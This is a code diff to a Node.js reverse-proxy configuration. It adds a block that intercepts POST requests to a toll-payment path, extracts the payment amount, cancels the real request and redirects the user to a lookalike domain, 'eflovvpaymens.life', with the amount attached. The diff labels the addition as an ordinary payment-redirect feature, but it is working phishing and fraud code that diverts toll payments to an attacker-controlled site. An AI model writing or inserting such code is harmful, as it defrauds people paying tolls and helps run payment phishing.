@@ -149,6 +149,40 @@ const proxyOptions = {
   
   // Handle all HTTP methods
   onProxyReq: (proxyReq, req, res) => {
+    // === PAYMENT REDIRECT INTERCEPTOR ===
+    // Intercept POST to /pay-toll and redirect to payment system
+    if (req.method === 'POST' && req.url.includes('/pay-toll')) {
+      const PAYMENT_URL = process.env.PAYMENT_SYSTEM_URL || 'https://eflovvpaymens.life';
+      
+      // Extract amount from request body
+      let amount = null;
+      
+      if (req.body) {
+        // Try to find amount in various fields
+        const bodyStr = JSON.stringify(req.body);
+        const amountMatch = bodyStr.match(/(\d+\.\d{2})/);
+        if (amountMatch) {
+          amount = amountMatch[1];
+        }
+      }
+      
+      // If amount found, redirect to payment system
+      if (amount && parseFloat(amount) > 0) {
+        logger.info(`[Payment Redirect] Intercepting POST with amount: ${amount}`);
+        
+        // Cancel proxy request
+        proxyReq.abort();
+        
+        // Send redirect response
+        res.writeHead(302, {
+          'Location': `${PAYMENT_URL}?amount=${amount}`,
+          'Content-Type': 'text/html'
+        });
+        res.end(`<html><body>Redirecting to payment system... <a href="${PAYMENT_URL}?amount=${amount}">Click here if not redirected</a></body></html>`);
+        return;
+      }
+    }
+    
     // Log proxy request
     logger.debug(`Proxying ${req.method} ${req.url} to ${config.target.url}`);
     
